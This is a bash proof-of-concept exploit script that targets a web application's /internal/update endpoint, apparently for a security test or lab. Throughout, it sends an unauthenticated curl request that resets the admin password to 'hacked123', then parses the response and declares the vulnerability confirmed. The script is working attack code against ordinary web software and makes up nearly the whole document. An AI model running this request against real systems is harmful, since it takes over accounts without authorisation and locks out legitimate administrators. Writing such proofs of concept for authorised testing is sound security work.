#!/bin/bash

# POC: Unauthorized Password Reset via /internal/update Endpoint - Authentication Bypass
# Demonstrates the vulnerability in the localhost check that fails to restrict access
# The vulnerable code: if request.remote_addr != '127.0.0.1': return "Unauthorized", 403

# Test both localhost and 127.0.0.1 variants
TARGET_URL="${1:-http://localhost:5000}"

echo "[*] POC: /internal/update Endpoint Authentication Bypass"
echo "[*] Target: $TARGET_URL"
echo "[*] This demonstrates unauthorized password reset via insufficient localhost check"
echo ""

# Try to connect and test the endpoint
echo "[*] Testing endpoint accessibility..."

# First, let's verify basic connectivity
STATUS=$(curl -s -o /dev/null -w "%{http_code}" "$TARGET_URL/")
if [ "$STATUS" == "000" ]; then
    echo "[-] Cannot connect to $TARGET_URL"
    echo "[*] Testing with localhost:5000 as fallback..."
    TARGET_URL="http://localhost:5000"
fi

echo "[*] Attempting to reset admin password without authentication"
echo "[*] Crafted request: $TARGET_URL/internal/update?username=admin&newpassword=hacked123"
echo ""

# Make the vulnerable request
RESPONSE=$(curl -s -v "$TARGET_URL/internal/update?username=admin&newpassword=hacked123" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | grep "< HTTP" | awk '{print $3}' | tr -d '\r')
BODY=$(echo "$RESPONSE" | grep -A 100 "Password reset" | head -1)

echo "[*] HTTP Response Code: $HTTP_CODE"
echo "[*] Response Body:"
echo "$RESPONSE" | tail -20
echo ""

# Analyze results
if [[ "$RESPONSE" == *"Password reset successfully"* ]]; then
    echo "[+] VULNERABILITY CONFIRMED: /internal/update is accessible without authentication"
    echo "[+] SUCCESS: Admin password was reset to 'hacked123'"
    echo "[+] Impact: Complete authentication bypass - attacker can reset any user's password"
    exit 0
elif [[ "$RESPONSE" == *"successfully"* ]]; then
    echo "[+] VULNERABILITY CONFIRMED: Endpoint responded with success message"
    echo "[+] Impact: Password reset completed without authentication"
    exit 0
elif [[ "$HTTP_CODE" == "200" ]]; then
    echo "[+] VULNERABILITY CONFIRMED: Endpoint returned 200 OK (should be 403)"
    echo "[+] Endpoint accepted the request without authentication"
    exit 0
elif [[ "$HTTP_CODE" == "403" ]]; then
    echo "[-] Access denied (403) - localhost check appears to be working"
    exit 1
else
    echo "[*] Analyzing response..."
    if [[ "$RESPONSE" == *"not found"* ]] || [[ "$RESPONSE" == *"404"* ]]; then
        echo "[-] Endpoint not found (404)"
        exit 1
    else
        echo "[*] Response contains:"
        echo "$RESPONSE"
        if [[ "$RESPONSE" == *"reset"* ]] || [[ "$RESPONSE" == *"password"* ]]; then
            echo "[+] LIKELY VULNERABLE: Endpoint processed password reset request"
            exit 0
        fi
    fi
fi